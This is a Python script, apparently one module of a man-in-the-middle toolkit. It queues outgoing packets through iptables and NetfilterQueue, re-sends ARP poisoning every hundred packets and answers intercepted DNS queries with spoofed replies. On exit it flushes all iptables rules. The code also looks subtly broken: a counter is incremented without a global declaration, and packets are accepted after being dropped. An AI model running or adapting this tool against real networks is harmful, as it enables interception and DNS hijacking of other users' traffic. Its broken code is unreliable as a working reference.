from netfilterqueue import NetfilterQueue
import os
import scapy.all as scapy

import dns_spoofing
import arp_spoofing

#first upgrade pip to version 18 then upgrade to newest
#sudo apt-get install build-essential python-dev libnetfilter-queue-dev
#pip install NetfilterQueue


#For proxy-ing we rely on port forwarding and use netfilterqueue to intercept
#before packets leave the machine

def setup_iptables():
    os.system("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0")

def disable_port_forwarding():
    os.system("sudo sysctl -w net.ipv4.ip_forward=0")

def undo_iptables():
    os.system("sudo iptables --flush")

def enable_port_forwarding():
    os.system("sudo sysctl -w net.ipv4.ip_forward=1")

def setup_proxy():
    dns_spoofing.arp_prep_automated()

    setup_iptables()
    disable_port_forwarding()
    
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, proxy)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        undo_iptables()
        enable_port_forwarding()
        nfqueue.unbind()


packet_nr = 0
def proxy(packet):
    packet_nr += 1
    if packet_nr % 100 == 0:
        dns_spoofing.arp_tick()
        
    if dns_spoofing.isDnsQuery(packet):
        dns_spoofing.dns_spoof(packet)
        packet.drop()
    
    packet.accept() #allows to continue